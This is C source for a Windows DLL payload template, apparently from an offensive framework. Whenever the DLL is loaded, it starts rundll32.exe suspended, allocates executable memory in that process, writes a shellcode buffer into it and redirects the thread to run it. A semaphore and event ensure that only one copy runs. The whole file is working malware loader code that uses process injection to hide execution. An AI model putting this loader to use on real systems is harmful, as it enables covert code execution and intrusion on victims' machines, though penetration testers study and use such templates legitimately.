#include <windows.h>
#include "template.h"

#if BUILDMODE == 2
/* hand-rolled bzero allows us to avoid including ms vc runtime */
void inline_bzero(void *p, size_t l)
{
	BYTE *q = (BYTE *)p;
	size_t x = 0;
	for (x = 0; x < l; x++)
		*(q++) = 0x00;
}

#endif


void ExecutePayload(void);

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
		case DLL_PROCESS_ATTACH:
			ExecutePayload();
			break;

		case DLL_PROCESS_DETACH:
			// Code to run when the DLL is freed
			break;

		case DLL_THREAD_ATTACH:
			// Code to run when a thread is created during the DLL's lifetime
			break;

		case DLL_THREAD_DETACH:
			// Code to run when a thread ends normally.
			break;
	}
	return TRUE;
}

// Use a combination semaphore / event to check if the payload is already running and when it is, don't start a new
// instance. This is to fix situations where the DLL is loaded multiple times into a host process and prevents the
// payload from being executed multiple times. An event object is used to determine if the payload is currently running
// in a child process. The event handle is created by this process (the parent) and configured to be inherited by the
// child. While the child process is running, the event handle can be successfully opened. When the child process exits,
// the event handle that was inherited from the parent will be automatically closed and subsequent calls to open it will
// fail. This indicates that the payload is no longer running and a new instance can be created.
BOOL Synchronize(void) {
	BOOL bResult = TRUE;
	BOOL bRelease = FALSE;
	HANDLE hSemaphore = NULL;
	HANDLE hEvent = NULL;
	SECURITY_ATTRIBUTES SecurityAttributes;

	// step 1: define security attributes that permit handle inheritance
	SecurityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	SecurityAttributes.lpSecurityDescriptor = NULL;
	SecurityAttributes.bInheritHandle = TRUE;

	do {
		// step 2: create a semaphore to synchronize this routine
		if ((hSemaphore = CreateSemaphoreA(&SecurityAttributes, 1, 1, szSyncNameS)) == NULL) {
			// if the semaphore creation fails, break out using the default TRUE result, this shouldn't happen
			break;
		}

		bResult = FALSE;
		// step 3: acquire the semaphore, if the operation timesout another instance is already running so exit
		if (WaitForSingleObject(hSemaphore, 0) == WAIT_TIMEOUT) {
			break;
		}
		bRelease = TRUE;

		// step 4: check if the event already exists
		if (hEvent = OpenEventA(READ_CONTROL | SYNCHRONIZE, TRUE, szSyncNameE)) {
			// if the event already exists, do not continue
			CloseHandle(hEvent);
			break;
		}

		// step 5: if the event does not already exist, create a new one that will be inherited by the child process
		if (hEvent = CreateEventA(&SecurityAttributes, TRUE, TRUE, szSyncNameE)) {
			bResult = TRUE;
		}
	} while (FALSE);


	// step 6: release and close the semaphore as necessary
	if (hSemaphore) {
		if (bRelease) {
			ReleaseSemaphore(hSemaphore, 1, NULL);
		}
		CloseHandle(hSemaphore);
	}
	// *do not* close the event handle (hEvent), it needs to be inherited by the child process
	return bResult;
}

void ExecutePayload(void) {
	int error;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	CONTEXT ctx;
	DWORD prot;
	LPVOID ep;

	// Start up the payload in a new process
	inline_bzero( &si, sizeof( si ));
	si.cb = sizeof(si);

	if (Synchronize()) {
		// Create a suspended process, write shellcode into stack, make stack RWX, resume it
		if (CreateProcess(NULL, "rundll32.exe", NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
			ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
			GetThreadContext(pi.hThread, &ctx);

			ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

			WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);

	#ifdef _WIN64
			ctx.Rip = (DWORD64)ep;
	#else
			ctx.Eip = (DWORD)ep;
	#endif

			SetThreadContext(pi.hThread,&ctx);

			ResumeThread(pi.hThread);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
		}
	}
	ExitThread(0);
}
